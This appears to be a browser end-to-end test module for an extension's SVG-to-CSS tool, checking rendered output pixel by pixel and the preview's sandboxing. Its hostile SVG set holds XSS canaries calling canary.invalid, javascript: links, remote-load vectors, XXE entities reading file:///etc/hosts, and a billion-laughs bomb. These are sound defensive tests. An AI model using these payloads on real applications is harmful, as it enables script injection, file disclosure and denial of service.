// The SVG to CSS tool in the built extension (docs/tools/specs/svg-to-css.md): its scenarios (§2) with the page's real
// controls, and what only Chrome can tell — run by scripts/e2e-tools.mjs. Names: 'SVG to CSS: …'; screenshots
// tool-svg-to-css-NN-….
//
// - The tool's whole promise, proved rather than assumed: every result it gives works in CSS. For each example (§10 and
//   the cleanup's own cases), each output form (background-image, mask-image, url(), Data URI) and both encodings, the
//   tool's text is put as it is into a stylesheet (or, the Data URI, into `<img src="…">`) of a plain page served from
//   loopback — outside the extension, whose policy forbids data: images — next to the original SVG file drawn
//   directly by the same CSS (background-image / mask-image of the file's URL, `<img>` of it). The page is captured
//   once and every tile compared with its reference pixel by pixel; every URI is also decoded by `<img>`, and the URL
//   CSS parsed out of each declaration is fetched back and compared with the prepared SVG the tool previews.
// - What each encoded character is for, by breaking it: a URI with one kind of character left raw, in the same page.
// - The preview: `<img>` (and, for mask-image, an inline SVG mask) on a `blob:` URL under the extension's policy;
//   every URL tracked and revoked; a hostile set of SVGs — scripts, handlers, foreignObject, remote use / image /
//   feImage, CSS url() and @import, a stylesheet instruction, external entities, an entity bomb — with every request of
//   the browser context recorded (Playwright and CDP; remote names are *.invalid, answered by a route), a canary a
//   script would set, the page's address, popups, `securitypolicyviolation`, the longest frame, the preview's pixels.
// - §12: a megabyte of SVG and four, both encodings — the tool's work, the parser's and the text field's cost apart.
// - §7 on the start page, history (D17), light and dark screenshots.
// The clipboard is a stand-in (stubClipboard), put back before the module ends; so are URL.createObjectURL / revoke.
// Navigates by replacing the current history entry (Chrome keeps 50 per tab).

/* global document, window, location, chrome, requestAnimationFrame, HTMLTextAreaElement, DataTransfer, ClipboardEvent,
   OffscreenCanvas, Image, getComputedStyle, DOMParser -- page.evaluate callbacks run in the pages */

import { createServer } from 'node:http';
import { inflateSync } from 'node:zlib';
import { historyRecords, inDarkTheme, settledShot, stubClipboard, waitForHistoryRecord } from '../e2e-helpers.mjs';

const T = 'SVG to CSS';
const INVALID = /^(?:https?|wss?):\/\/[^/?#]*\.invalid(?:[:/?#]|$)/;
const NS = 'xmlns="http://www.w3.org/2000/svg"';
const XLINK = 'xmlns:xlink="http://www.w3.org/1999/xlink"';

// ---- The examples: §10's rows and the cleanup's own cases (invented content only)
const icon = (fill, extra = '') =>
  `<svg ${NS} viewBox="0 0 10 10">${extra}<rect width="10" height="10" fill="${fill}"/></svg>`;
export const EXAMPLES = [
  ['row 1, red icon', icon('#ff0000')],
  ['row 2, no xmlns', '<svg viewBox="0 0 10 10"><rect width="10" height="10" fill="#00ff00"/></svg>'],
  [
    'row 3, prolog, comment, DOCTYPE, indentation',
    `<?xml version="1.0" encoding="UTF-8"?>\n<!-- Generator: editor -->\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n<svg ${NS} viewBox="0 0 10 10">\n  <rect width="10" height="10" fill="#0000ff"/>\n</svg>\n`,
  ],
  [
    'row 4, CSS quotes, a value with an apostrophe',
    `<svg ${NS} viewBox="0 0 10 10"><style>rect{fill:url("#g")}</style><linearGradient id="g"><stop stop-color="#ff00ff"/></linearGradient><rect width="10" height="10" data-x="it's"/></svg>`,
  ],
  ['row 5, % and #', `<svg ${NS} viewBox="0 0 10 10"><rect width="100%" height="100%" fill="#00ffff"/></svg>`],
  ['row 6, Cyrillic and an emoji', icon('#ffff00', '<title>Значок 🙂</title>')],
  [
    'row 7, long Cyrillic title',
    `<svg ${NS} viewBox="0 0 24 24"><title>Значок поиска по каталогу</title><path d="M2 2h20v20z"/></svg>`,
  ],
  [
    'row 8, xlink without its declaration',
    `<svg ${NS} viewBox="0 0 10 10"><defs><rect id="r" width="10" height="10" fill="#800000"/></defs><use xlink:href="#r"/></svg>`,
  ],
  [
    'row 9, text with two tspans',
    `<svg ${NS} viewBox="0 0 10 10"><rect width="10" height="10" fill="#008000"/><text x="0" y="9" font-size="6"><tspan>a</tspan> <tspan>b</tspan></text></svg>`,
  ],
  [
    'row 10, line breaks and a tab',
    `<svg ${NS} viewBox="0 0 10 10">\n\t<rect width="10" height="10" fill="#000080"/>\n</svg>`,
  ],
  ['row 11, olive', icon('#808000')],
  ['row 12, a circle (mask)', `<svg ${NS} viewBox="0 0 10 10"><circle cx="5" cy="5" r="5"/></svg>`],
  ['row 13, empty svg', `<svg ${NS}/>`],
  ['row 15, backslash', icon('#c0c0c0', '<desc>C:\\path</desc>')],
  ['row 16, U+FEFF first', `\u{FEFF}${icon('#ff8000')}`],
  [
    'cleanup: xml:space="preserve" root, indented text',
    `<svg ${NS} viewBox="0 0 40 20" xml:space="preserve">\n  <g>\n    <rect width="40" height="20" fill="#ffeecc"/>\n    <text x="1" y="14" font-size="9">  a   b  <tspan fill="#c00"> c </tspan></text>\n  </g>\n</svg>`,
  ],
  [
    'cleanup: style with descendant selectors, CDATA, multi-line attributes, comments in text',
    `<svg ${NS}\n     viewBox="0 0 20 20">\n  <style><![CDATA[\n    g  rect { fill: #3366cc }\n    g>circle{fill:#ffcc00}\n  ]]></style>\n  <g>\n    <rect width="20"\n          height="20"/>\n    <circle cx="10" cy="10"\n            r="6"/>\n  </g>\n  <path d="M2 18\n           L18 18" stroke="#000" stroke-width="2"/>\n  <text x="2" y="8" font-size="6">x<!-- note -->y</text>\n</svg>`,
  ],
  [
    'cleanup: DOCTYPE entity used in a fill (the DOCTYPE stays)',
    `<?xml version="1.0"?>\n<!DOCTYPE svg [\n  <!ENTITY brand "#9933ff">\n]>\n<!-- logo -->\n<svg ${NS} viewBox="0 0 10 10">\n  <rect width="10" height="10" fill="&brand;"/>\n</svg>`,
  ],
  [
    '&amp; in text, a gradient (the Data URI in an HTML attribute)',
    `<svg ${NS} viewBox="0 0 10 10"><desc>Black &amp; white</desc><linearGradient id="g"><stop offset="0" stop-color="#000"/><stop offset="1" stop-color="#fff"/></linearGradient><rect width="10" height="10" fill="url(#g)"/></svg>`,
  ],
  [
    'every printable ASCII character left raw',
    `<svg ${NS} viewBox="0 0 10 10"><desc> !$'()*+,-./0123456789:;=?@[]^_\`{|}~ ABCxyz</desc><rect width="10" height="10" fill="#ff0066"/></svg>`,
  ],
  [
    'a literal %3C in text',
    `<svg ${NS} viewBox="0 0 10 10"><desc>%3C is a less-than sign</desc><rect width="10" height="10" fill="#0066ff"/></svg>`,
  ],
  [
    'attributes separated by a tab',
    `<svg ${NS} viewBox="0 0 10 10"><rect\twidth="10"\theight="10"\tfill="#66ff00"/></svg>`,
  ],
];

// ---- The hostile set (§5 «Предпросмотр», §11): what would run, load or navigate if shown any other way than as an image
const CANARY =
  "try{top.__svgPwned=1;parent.__svgPwned=1}catch(e){};window.__svgPwned=1;try{localStorage.setItem('svgPwned','1')}catch(e){};" +
  "try{chrome.storage.local.set({svgPwned:1})}catch(e){};try{fetch('https://canary.invalid/fetch')}catch(e){};" +
  "try{new Image().src='https://canary.invalid/img'}catch(e){};try{top.location='https://canary.invalid/nav'}catch(e){}";
const hostileBase = inner =>
  `<svg ${NS} ${XLINK} width="20" height="10"><rect width="20" height="10" fill="#00ff00"/>${inner}</svg>`;
const xmlEscape = text => text.replaceAll('&', '&amp;').replaceAll('"', '&quot;').replaceAll('<', '&lt;');
/** `green`: the preview's pixel at (5, 5) must stay the background's green — what the SVG names over it is not painted. */
export const hostileSvgs = id => [
  {
    name: 'scripts: inline, remote, the extension’s own file',
    svg: hostileBase(
      `<script>${CANARY}</script><script href="https://script.invalid/a.js"/><script xlink:href="chrome-extension://${id}/theme-boot.js"/>`,
    ),
    green: true,
  },
  {
    name: 'event handlers: onload, onclick, SMIL onbegin',
    svg: hostileBase(
      `<rect width="1" height="1" onclick="${xmlEscape(CANARY)}"/><animate attributeName="x" dur="1ms" onbegin="${xmlEscape(CANARY)}"/>`,
    ).replace('<svg ', `<svg onload="${xmlEscape(CANARY)}" `),
    green: true,
  },
  {
    name: '<foreignObject> with HTML: script, img, iframe, autofocus handler, meta refresh, stylesheet',
    svg: hostileBase(
      `<foreignObject width="20" height="10"><div xmlns="http://www.w3.org/1999/xhtml"><script>${CANARY}</script><img src="https://fo-img.invalid/a.png" onerror="${xmlEscape(CANARY)}"/><iframe src="https://fo-frame.invalid/"></iframe><input autofocus="" onfocus="${xmlEscape(CANARY)}"/><meta http-equiv="refresh" content="0;url=https://fo-refresh.invalid/"/><link rel="stylesheet" href="https://fo-css.invalid/a.css"/></div></foreignObject>`,
    ),
    green: false,
  },
  {
    name: '<use>, <image>, <feImage> with remote addresses',
    svg: hostileBase(
      `<use href="https://use.invalid/s.svg#a"/><use xlink:href="//use2.invalid/s.svg#b"/><image href="https://image.invalid/a.png" x="15" width="5" height="5"/><filter id="f"><feImage href="https://feimage.invalid/c.png"/></filter><rect x="18" width="1" height="1" filter="url(#f)"/>`,
    ),
    green: true,
  },
  {
    name: 'CSS: @import, @font-face, fill, background and cursor by url()',
    svg: hostileBase(
      `<style>@import url(https://import.invalid/a.css); @font-face{font-family:f;src:url(https://font.invalid/f.woff2)} text{font-family:f} #p{fill:url(https://fill.invalid/p.svg#p)} svg{background-image:url(https://bg.invalid/a.png);cursor:url(https://cursor.invalid/c.cur),auto}</style><rect id="p" x="18" width="2" height="2"/><rect x="17" y="8" width="1" height="1" style="filter:url(https://filter.invalid/f.svg#f)"/><text x="18" y="9" font-size="2">x</text>`,
    ),
    green: true,
  },
  {
    name: 'links: https: and javascript:',
    svg: hostileBase(
      `<a href="https://nav.invalid/" target="_top"><rect width="20" height="10" fill="#00ff00"/></a><a href="javascript:${xmlEscape(CANARY)}"><rect x="19" width="1" height="1" fill="#00ff00"/></a>`,
    ),
    green: true,
  },
  {
    name: 'stylesheet processing instructions: XSLT and CSS',
    svg: `<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="https://xsl.invalid/a.xsl"?><?xml-stylesheet href="https://css-pi.invalid/a.css"?>${hostileBase('')}`,
    green: true,
  },
  {
    name: 'external entities: SYSTEM by https: and file:, a parameter entity',
    svg: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "https://xxe.invalid/x"><!ENTITY file SYSTEM "file:///etc/hosts"><!ENTITY % pe SYSTEM "https://pe.invalid/x.dtd"> %pe;]>${hostileBase('<text y="9" font-size="3">&xxe;&file;</text>')}`,
    green: true,
    mayRefuse: true,
  },
  {
    name: 'an XML entity bomb (billion laughs, 10^9 expansions)',
    svg: `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "lollollol"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">${'bcdefghi'
      .split('')
      .map((c, i) => `<!ENTITY ${'cdefghij'[i]} "${`&${c};`.repeat(10)}">`)
      .join('')}]>${hostileBase('<text y="9" font-size="3">&j;</text>')}`,
    green: false,
    mayRefuse: true,
  },
];

// ---- A PNG decoder for Chrome's screenshots (8-bit RGB or RGBA, not interlaced): pixels to compare
const decodePng = buffer => {
  let at = 8;
  let width = 0;
  let height = 0;
  let channels = 4;
  const idat = [];
  while (at < buffer.length) {
    const length = buffer.readUInt32BE(at);
    const type = buffer.toString('latin1', at + 4, at + 8);
    const data = buffer.subarray(at + 8, at + 8 + length);
    if (type === 'IHDR') {
      width = data.readUInt32BE(0);
      height = data.readUInt32BE(4);
      if (data[8] !== 8 || data[12] !== 0) throw new Error('unsupported PNG');
      channels = data[9] === 6 ? 4 : data[9] === 2 ? 3 : 0;
      if (!channels) throw new Error(`unsupported PNG colour type ${data[9]}`);
    } else if (type === 'IDAT') idat.push(data);
    at += 12 + length;
  }
  const raw = inflateSync(Buffer.concat(idat));
  const stride = width * channels;
  const out = Buffer.alloc(width * height * 4);
  const prev = Buffer.alloc(stride);
  const line = Buffer.alloc(stride);
  for (let y = 0; y < height; y++) {
    const filter = raw[y * (stride + 1)];
    const src = raw.subarray(y * (stride + 1) + 1, (y + 1) * (stride + 1));
    for (let x = 0; x < stride; x++) {
      const a = x >= channels ? line[x - channels] : 0;
      const b = prev[x];
      const c = x >= channels ? prev[x - channels] : 0;
      let v = src[x];
      if (filter === 1) v += a;
      else if (filter === 2) v += b;
      else if (filter === 3) v += (a + b) >> 1;
      else if (filter === 4) {
        const p = a + b - c;
        const pa = Math.abs(p - a);
        const pb = Math.abs(p - b);
        const pc = Math.abs(p - c);
        v += pa <= pb && pa <= pc ? a : pb <= pc ? b : c;
      }
      line[x] = v & 255;
    }
    for (let x = 0; x < width; x++) {
      out[(y * width + x) * 4] = line[x * channels];
      out[(y * width + x) * 4 + 1] = line[x * channels + 1];
      out[(y * width + x) * 4 + 2] = line[x * channels + 2];
      out[(y * width + x) * 4 + 3] = channels === 4 ? line[x * channels + 3] : 255;
    }
    line.copy(prev);
  }
  return { width, height, pixels: out };
};

const FORMS = [
  ['background-image', 'background-image'],
  ['mask-image', 'mask-image'],
  ['url()', 'url'],
  ['Data URI', 'data-uri'],
];
const TILE = 40;
const GAP = 4;

export default async ({ ctx, page, base, check, shoot, sleep, report }) => {
  const facts = (report.svgToCss = {});
  const id = new URL(base).host;
  const origin = `chrome-extension://${id}`;

  // ---- What leaves the extension, for the whole module, and what is routed instead.
  const outside = [];
  const onRequest = request => {
    const url = request.url();
    if (
      !url.startsWith(origin) &&
      !url.startsWith('blob:') &&
      !url.startsWith('data:') &&
      !url.startsWith('http://127.0.0.1:')
    )
      outside.push(url);
  };
  ctx.on('request', onRequest);
  const routed = [];
  await ctx.route(INVALID, route => {
    routed.push(route.request().url());
    return route.fulfill({ status: 200, contentType: 'text/plain', body: '' });
  });
  const cdp = await ctx.newCDPSession(page);
  await cdp.send('Network.enable');
  const cdpRequests = [];
  const onCdp = e => cdpRequests.push(e.request.url);
  cdp.on('Network.requestWillBeSent', onCdp);
  const popups = [];
  const onPopup = p => popups.push(p.url());
  ctx.on('page', onPopup);

  // ---- Helpers
  const toolUrl = `${base}#/tools/svg-to-css`;
  const go = async url => {
    if (page.url().split('#')[0] === base.split('#')[0]) await page.evaluate(u => location.replace(u), url);
    else await page.goto(url);
    await page.waitForFunction(h => location.hash === h, new URL(url).hash, { timeout: 5_000 });
  };
  const inputField = page.locator('#svg-to-css-input');
  const cssField = page.locator('#svg-to-css-result');
  const statusLine = () =>
    page
      .locator('[data-part="status"]')
      .innerText()
      .then(t => t.trim());
  const sizesLine = () =>
    page
      .locator('[data-part="sizes"]')
      .innerText()
      .then(t => t.trim());
  const notes = () => page.locator('[data-part="note"]').allInnerTexts();
  /** The field set as a paste would set it (one input event). */
  const put = text =>
    page.evaluate(value => {
      const field = document.querySelector('#svg-to-css-input');
      Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value').set.call(field, value);
      field.dispatchEvent(new Event('input', { bubbles: true }));
    }, text);
  const css = () => cssField.inputValue();
  /** Sets the input and waits for a result other than `previous` (or an error line). */
  const putAndRead = async (text, previous, timeout = 10_000) => {
    await put(text);
    await page.waitForFunction(
      prev => {
        const value = document.querySelector('#svg-to-css-result').value;
        const error = document.querySelector('[data-part="status"]')?.textContent.trim();
        return (value !== '' && value !== prev) || (error !== '' && error !== undefined);
      },
      previous,
      { timeout },
    );
    return css();
  };
  const previewState = () =>
    page
      .locator('[data-preview]')
      .first()
      .getAttribute('data-preview')
      .catch(() => null);
  const settledPreview = async () => {
    await page
      .waitForFunction(
        () => {
          const p = document.querySelector('[data-preview]');
          if (p && !['loading', 'empty'].includes(p.getAttribute('data-preview'))) return true;
          return (document.querySelector('[data-part="status"]')?.textContent ?? '').trim() !== '';
        },
        null,
        { timeout: 10_000 },
      )
      .catch(() => {});
    return previewState();
  };
  const pickOutput = async label => {
    await page.getByLabel('Output').click();
    await page.getByRole('option', { name: label, exact: true }).click();
    await page.waitForFunction(l => document.querySelector('#svg-to-css-output')?.textContent?.includes(l), label);
  };
  const setEncoding = name => page.getByRole('radio', { name, exact: true }).click();
  const setMinify = async on => {
    const box = page.getByRole('checkbox', { name: 'Minify' });
    if ((await box.getAttribute('aria-checked')) !== String(on)) await box.click();
  };
  /** The preview's pixel, drawn on a canvas from the `<img>` (an image of the page's own origin leaves it readable). */
  const pixel = (x, y) =>
    page.evaluate(
      ([px, py]) => {
        const img = document.querySelector('[data-preview] img');
        if (!img?.naturalWidth) return null;
        const canvas = new OffscreenCanvas(img.naturalWidth, img.naturalHeight);
        const g = canvas.getContext('2d');
        g.drawImage(img, 0, 0);
        try {
          return [...g.getImageData(px, py, 1, 1).data];
        } catch {
          // An SVG image with <foreignObject> taints the canvas (Chrome): its pixels are not readable.
          return 'tainted';
        }
      },
      [x, y],
    );
  /** The prepared SVG the preview shows: the Blob behind its blob: URL, as text (kept by the stand-in below). */
  const prepared = () =>
    page.evaluate(async () => {
      const img = document.querySelector('[data-preview] img');
      const blob = img && window.__svgUrls.blobs.get(img.getAttribute('src'));
      return blob ? blob.text() : null;
    });
  const timed = async (fn, after = 300) => {
    await page.evaluate(() => {
      window.__svgFrames = { longest: 0, last: performance.now(), on: true };
      const tick = t => {
        const f = window.__svgFrames;
        if (!f?.on) return;
        f.longest = Math.max(f.longest, t - f.last);
        f.last = t;
        requestAnimationFrame(tick);
      };
      requestAnimationFrame(tick);
    });
    const t0 = Date.now();
    const value = await fn();
    const ms = Date.now() - t0;
    await sleep(after);
    const longest = await page.evaluate(() => {
      const f = window.__svgFrames;
      f.on = false;
      delete window.__svgFrames;
      return Math.round(f.longest);
    });
    return { value, ms, longest };
  };

  // ---- D16: nothing of the tool on the start route; its field finds it by a keyword
  const toolChunk = url => /\/assets\/SvgToCssTool-[^/]+\.js$/.test(url);
  {
    const start = await ctx.newPage();
    const loaded = [];
    start.on('request', r => toolChunk(r.url()) && loaded.push(r.url()));
    await start.goto(base);
    const field = start.getByRole('combobox', { name: 'Find a tool or search the web' });
    await field.waitFor();
    await start.waitForLoadState('networkidle');
    await field.fill('mask-image');
    const first = (await start.getByRole('option').first().innerText()).split('\n')[0];
    check(
      `${T}: nothing of the tool on the start route; its field finds it by "mask-image"`,
      loaded.length === 0 && first.includes(T),
      `loaded ${JSON.stringify(loaded)}; first row "${first}"`,
    );
    await start.close();
  }

  // ---- Open the tool
  await go(toolUrl);
  await page.getByRole('heading', { name: T }).waitFor();
  // The page shows "Loading…" until the tool's history is open, which takes longer right after another tool's large records.
  await inputField.waitFor({ timeout: 30_000 });
  await page.evaluate(() => {
    window.__svgViolations = [];
    window.__svgViolationListener = e => window.__svgViolations.push(`${e.violatedDirective} ${e.blockedURI}`);
    document.addEventListener('securitypolicyviolation', window.__svgViolationListener);
    const created = new Set();
    const blobs = new Map();
    window.__svgUrls = { created, blobs, made: 0, create: URL.createObjectURL, revoke: URL.revokeObjectURL };
    URL.createObjectURL = blob => {
      const url = window.__svgUrls.create.call(URL, blob);
      created.add(url);
      blobs.set(url, blob);
      window.__svgUrls.made++;
      return url;
    };
    URL.revokeObjectURL = url => {
      created.delete(url);
      blobs.delete(url);
      return window.__svgUrls.revoke.call(URL, url);
    };
  });
  const liveUrls = () => page.evaluate(() => [...window.__svgUrls.created]);
  check(
    `${T}: opens empty — Output background-image, URL-encoded, Minify on; no result, no preview, Copy off`,
    (await css()) === '' &&
      (await page.locator('#svg-to-css-output').innerText()).includes('background-image') &&
      (await page.getByRole('radio', { name: 'URL-encoded' }).getAttribute('aria-checked')) === 'true' &&
      (await page.getByRole('checkbox', { name: 'Minify' }).getAttribute('aria-checked')) === 'true' &&
      (await page.getByRole('button', { name: 'Copy', exact: true }).isDisabled()) &&
      (await page.locator('[data-preview] img').count()) === 0,
  );
  await settledShot(shoot, page, 'tool-svg-to-css-01-empty.png');
  const clipboard = await stubClipboard(page);

  // ---- §2.1: the icon, its sizes, the preview, Copy
  const RED = EXAMPLES[0][1];
  const RED_CSS =
    "background-image: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 10 10'%3E%3Crect width='10' height='10' fill='%23ff0000'/%3E%3C/svg%3E\");";
  await putAndRead(RED, '');
  const redPreview = await settledPreview();
  const redPixel = await pixel(5, 5);
  await page.getByRole('button', { name: 'Copy', exact: true }).click();
  await page.getByRole('button', { name: 'Copied', exact: true }).waitFor({ timeout: 2_000 });
  check(
    `${T}: §2.1 — the CSS of §10 row 1, "144 characters · Base64: 174", the preview a blob: <img> painting red, Copy copies it`,
    (await css()) === RED_CSS &&
      (await sizesLine()) === '144 characters · Base64: 174' &&
      redPreview === 'shown' &&
      JSON.stringify(redPixel) === '[255,0,0,255]' &&
      (await page.locator('[data-preview] img').getAttribute('src')).startsWith('blob:') &&
      (await clipboard.copied()).at(-1) === RED_CSS,
    `${await sizesLine()}; preview ${redPreview} ${JSON.stringify(redPixel)}`,
  );
  await settledShot(shoot, page, 'tool-svg-to-css-02-icon.png');

  // ---- §2.6: Chrome's own place for an unclosed tag
  {
    const text = `<svg ${NS}>\n<rect width="1">\n</svg>`;
    await putAndRead(text, RED_CSS);
    const words = await statusLine();
    await page.locator('[data-part="status"] button').click();
    const caret = await page.evaluate(() => {
      const f = document.querySelector('#svg-to-css-input');
      return { focused: document.activeElement === f, at: f.selectionStart };
    });
    check(
      `${T}: §2.6 — "Line 3, column 7" in Chrome (jsdom says 6), no result, no preview; the link puts the caret there`,
      words === 'Line 3, column 7: the SVG is not well-formed XML.' &&
        (await css()) === '' &&
        (await page.locator('[data-preview] img').count()) === 0 &&
        caret.focused &&
        caret.at === text.lastIndexOf('\n') + 1 + 6,
      `${words}; caret ${JSON.stringify(caret)}`,
    );
    await settledShot(shoot, page, 'tool-svg-to-css-03-error.png');
    const errors = {};
    for (const [name, svg] of [
      ['several roots', `<svg ${NS}/><svg ${NS}/>`],
      ['another root', '<html><body/></html>'],
      ['an unbound prefix', `<svg ${NS}><g inkscape:label="a"/></svg>`],
      ['not markup', 'just some text'],
    ]) {
      await put('');
      await put(svg);
      await page.waitForFunction(() => document.querySelector('[data-part="status"]').textContent.trim() !== '');
      errors[name] = await statusLine();
    }
    facts.errors = errors;
    check(
      `${T}: §6 in Chrome — several roots, another root, an unbound prefix and plain text are refused with words`,
      /^Line 1, column \d+: the SVG is not well-formed XML\.$/.test(errors['several roots']) &&
        errors['another root'] === 'The root element is <html>, not <svg>.' &&
        /the SVG is not well-formed XML\.$/.test(errors['an unbound prefix']) &&
        /the SVG is not well-formed XML\.$/.test(errors['not markup']),
      JSON.stringify(errors),
    );
  }

  // ---- §2.4 mask-image, its second tile; the notes
  await put('');
  await putAndRead(EXAMPLES[11][1], '');
  await pickOutput('mask-image');
  await settledPreview();
  await page.locator('[data-part="mask"]').waitFor();
  check(
    `${T}: §2.4 — mask-image declaration and the mask tile (an inline SVG mask on the same blob: URL)`,
    (await css()).startsWith('mask-image: url("data:image/svg+xml,%3Csvg ') &&
      (await page.locator('[data-part="mask"] image').getAttribute('href')) ===
        (await page.locator('[data-preview] img').getAttribute('src')),
  );
  await settledShot(shoot, page, 'tool-svg-to-css-04-mask.png');
  await pickOutput('background-image');

  // ---- The CSS proof: every example, form and encoding in a plain page on loopback
  const rows = [];
  let last = await css();
  for (const [label, form] of FORMS) {
    await pickOutput(label);
    for (const encoding of ['url', 'base64']) {
      await setEncoding(encoding === 'url' ? 'URL-encoded' : 'Base64');
      for (const [i, [name, svg]] of EXAMPLES.entries()) {
        await put('');
        await page.waitForFunction(() => document.querySelector('#svg-to-css-result').value === '');
        last = await putAndRead(svg, '');
        rows[i] ??= { name, svg, out: {} };
        rows[i].out[`${form}/${encoding}`] = last;
        if (form === 'background-image' && encoding === 'url') {
          await settledPreview();
          rows[i].prepared = await prepared();
          rows[i].notes = await notes();
        }
      }
    }
  }
  await setEncoding('URL-encoded');
  await pickOutput('background-image');
  await setMinify(false);
  for (const [i, [, svg]] of EXAMPLES.entries()) {
    await put('');
    await page.waitForFunction(() => document.querySelector('#svg-to-css-result').value === '');
    rows[i].out['background-image/url/no-minify'] = await putAndRead(svg, '');
    await settledPreview();
    rows[i].preparedRaw = await prepared();
  }
  await setMinify(true);
  const uriOf = text => /data:image\/svg\+xml[^"]*/.exec(text)?.[0] ?? '';

  // Negative cases: one kind of character left raw, by string surgery on the tool's own URIs.
  const ex = name => rows.find(r => r.name.startsWith(name));
  const urlUri = name => uriOf(ex(name).out['data-uri/url']);
  const decodeOnly = (uri, keep) => uri.replace(/%[0-9A-F]{2}/g, m => (keep(m) ? m : decodeURIComponent(m)));
  const negatives = [
    ['raw # (row 17)', urlUri('row 1,').replaceAll('%23', '#'), 'bg', 'row 1,'],
    ['only # encoded: <, > and spaces raw (row 18)', decodeOnly(urlUri('row 1,'), m => m === '%23'), 'bg', 'row 1,'],
    ['no xmlns (row 19)', urlUri('row 1,').replace("xmlns='http://www.w3.org/2000/svg' ", ''), 'bg', 'row 1,'],
    ['raw " in url("…")', urlUri('row 4,').replaceAll('%22', '"'), 'bg', 'row 4,'],
    ['raw \\ in url("…")', urlUri('row 15,').replaceAll('%5C', '\\'), 'bg', 'row 15,'],
    [
      'raw line feed',
      uriOf(ex('row 10,').out['background-image/url/no-minify']).replaceAll('%0A', '\n'),
      'bg',
      'row 10,',
    ],
    [
      'raw tab between attributes (Minify off)',
      uriOf(ex('attributes separated').out['background-image/url/no-minify']).replaceAll('%09', '\t'),
      'bg',
      'attributes separated',
    ],
    ['raw % before two hex digits', urlUri('a literal %3C').replace('%253C', '%3C'), 'bg', 'a literal %3C'],
    [
      'raw non-ASCII (UTF-8 page)',
      urlUri('row 6,').replace(/(?:%[89A-F][0-9A-F])+/g, m => decodeURIComponent(m)),
      'bg',
      'row 6,',
    ],
    ['raw & in <img src="…">', urlUri('&amp; in text').replaceAll('%26', '&'), 'img', '&amp; in text'],
    ['the tool’s %26 in <img src="…">', urlUri('&amp; in text'), 'img', '&amp; in text'],
    ["url('…') around a URI with ' inside", urlUri('row 1,'), 'single', 'row 1,'],
    ['unquoted url(…) around a URI with spaces', urlUri('row 1,'), 'bare', 'row 1,'],
    ['unquoted url(…) around Base64', uriOf(ex('row 1,').out['data-uri/base64']), 'bare', 'row 1,'],
  ];

  // The page: per example a row of tiles; references first.
  const files = new Map();
  const tiles = [];
  const styles = [];
  const bodyRows = [];
  rows.forEach((row, i) => {
    // The original file as drawn directly. Copied from HTML, an SVG without its namespaces drew there (the HTML parser
    // needs none): its reference is the file with them, as the tool adds them.
    const original = row.name.startsWith('row 2,')
      ? row.svg.replace('<svg ', `<svg ${NS} `)
      : row.name.startsWith('row 8,')
        ? row.svg.replace('<svg ', `<svg ${XLINK} `)
        : row.svg;
    files.set(`/orig-${i}.svg`, original);
    const cells = [];
    const add = (key, html, rule) => {
      const tid = `t${i}-${key.replace(/[^a-z0-9]/gi, '_')}`;
      tiles.push({ row: i, key, id: tid });
      cells.push(html(tid));
      if (rule) styles.push(`#${tid}{${rule}}`);
    };
    const box = 'width:40px;height:40px;';
    const bgBox = `${box}background-size:100% 100%;background-repeat:no-repeat;`;
    const maskBox = `${box}background-color:#000;mask-size:100% 100%;mask-repeat:no-repeat;`;
    add('ref-img', t => `<img id="${t}" src="/orig-${i}.svg" width="40" height="40" alt="">`);
    add('ref-bg', t => `<div id="${t}"></div>`, `${bgBox}background-image:url("/orig-${i}.svg");`);
    add('ref-mask', t => `<div id="${t}"></div>`, `${maskBox}mask-image:url("/orig-${i}.svg");`);
    for (const enc of ['url', 'base64']) {
      add(`bg/${enc}`, t => `<div id="${t}"></div>`, `${bgBox}${row.out[`background-image/${enc}`]}`);
      add(`url/${enc}`, t => `<div id="${t}"></div>`, `${bgBox}background-image:${row.out[`url/${enc}`]};`);
      add(`mask/${enc}`, t => `<div id="${t}"></div>`, `${maskBox}${row.out[`mask-image/${enc}`]}`);
      add(`img/${enc}`, t => `<img id="${t}" src="${row.out[`data-uri/${enc}`]}" width="40" height="40" alt="">`);
    }
    add('bg/url/no-minify', t => `<div id="${t}"></div>`, `${bgBox}${row.out['background-image/url/no-minify']}`);
    bodyRows.push(`<div class="row">${cells.join('')}</div>`);
  });
  const negStyles = [];
  const negRows = negatives.map(([name, uri, how, refName], k) => {
    const tid = `n${k}`;
    const refRow = rows.findIndex(r => r.name.startsWith(refName));
    const box = 'width:40px;height:40px;background-size:100% 100%;background-repeat:no-repeat;';
    if (how === 'img')
      return {
        name,
        tid,
        refRow,
        html: `<img id="${tid}" src="${uri}" width="40" height="40" alt="">`,
        ref: 'ref-img',
      };
    const value = how === 'single' ? `url('${uri}')` : how === 'bare' ? `url(${uri})` : `url("${uri}")`;
    // A stylesheet of its own: a raw quote or line feed must not swallow the rules after it.
    negStyles.push(`<style>#${tid}{${box}background-image:${value};}</style>`);
    return { name, tid, refRow, html: `<div id="${tid}"></div>`, ref: 'ref-bg', uri };
  });
  const html = `<!doctype html><html><head><meta charset="utf-8"><title>svg-to-css proof</title><style>
body{margin:0;background:#fff}.row{display:flex;gap:${GAP}px;margin-bottom:${GAP}px}#grid{padding:${GAP}px;width:max-content}
img,div{flex:none}
${styles.join('\n')}
</style>${negStyles.join('')}</head><body><div id="grid">${bodyRows.join('')}<div class="row">${negRows.map(n => n.html).join('')}</div></div></body></html>`;
  files.set('/index.html', html);
  const server = createServer((req, res) => {
    const body = files.get(req.url.split('?')[0]);
    if (body === undefined) {
      res.writeHead(404).end();
      return;
    }
    res.writeHead(200, {
      'content-type': req.url.endsWith('.svg') ? 'image/svg+xml' : 'text/html; charset=utf-8',
    });
    res.end(body);
  });
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  const proofOrigin = `http://127.0.0.1:${server.address().port}`;
  // In the full run every http request of the context is answered with a stub (the start page's checks keep the run
  // off the network): this page is the module's own, on the loopback interface, and is let through.
  const proofRoute = `${proofOrigin}/**`;
  await ctx.route(proofRoute, route => route.continue());
  const proof = await ctx.newPage();
